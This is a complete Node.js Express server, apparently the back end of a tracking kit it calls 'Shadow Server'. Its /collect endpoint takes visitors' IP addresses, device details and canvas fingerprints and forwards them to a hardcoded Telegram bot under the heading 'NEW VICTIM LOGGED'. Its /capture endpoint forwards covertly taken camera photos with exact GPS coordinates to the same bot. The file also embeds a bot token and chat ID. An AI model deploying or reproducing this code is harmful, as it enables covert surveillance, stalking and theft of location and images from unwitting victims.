const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// ENVIRONMENT VARIABLES (Use your Render env vars)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '9150805950:AAFQxMTrQRFBbfqfgQPlNqvqeWREFOqGGKc';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '1875307475';

async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const result = await response.json();
        if (!result.ok) console.error('Telegram error:', result.description);
    } catch (e) {
        console.error('Telegram send error:', e.message);
    }
}

async function sendPhotoToTelegram(buffer, caption) {
    try {
        const form = new FormData();
        form.append('chat_id', TELEGRAM_CHAT_ID);
        form.append('photo', buffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
        form.append('caption', caption);

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const response = await fetch(url, {
            method: 'POST',
            body: form
        });
        const result = await response.json();
        if (!result.ok) console.error('❌ Photo send error:', result.description);
        else console.log('✅ Photo sent to Telegram');
    } catch (e) {
        console.error('❌ Photo send failed:', e.message);
    }
}

function getClientIP(req) {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    return ip.split(',')[0].trim() || 'unknown';
}

app.post('/collect', async (req, res) => {
    const data = req.body;
    const ip = getClientIP(req);
    const timestamp = new Date().toISOString();
    
    console.log(`[${timestamp}] NEW HIT FROM IP: ${ip}`);

    const msg = `
🔔 <b>NEW VICTIM LOGGED</b> 🔔
📅 Time: ${timestamp}
🌐 IP: <code>${ip}</code>
📱 Device: ${data.userAgent || 'Unknown'}
💻 Platform: ${data.platform || 'Unknown'}
🖥️ Screen: ${data.screen?.width || '?'}x${data.screen?.height || '?'}
🎨 Canvas FP: <code>${(data.canvasFingerprint || '').substring(0, 30)}...</code>
    `;
    await sendToTelegram(msg);
    res.status(200).json({ status: 'received' });
});

app.post('/capture', async (req, res) => {
    console.log('📸 /capture endpoint hit');
    const { image, gps } = req.body;
    const ip = getClientIP(req);
    const timestamp = new Date().toISOString();

    if (!image) return res.status(400).json({ error: 'No image' });

    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    let caption = `📸 PHOTO CAPTURED AT ${timestamp}\nIP: ${ip}`;
    if (gps) {
        caption += `\n📍 EXACT GPS: ${gps.lat}, ${gps.lng} (ACCURACY ±${gps.accuracy}m)`;
    }

    await sendPhotoToTelegram(buffer, caption);
    res.status(200).json({ status: 'ok' });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🔥 Shadow Server running on port ${PORT}`);
});
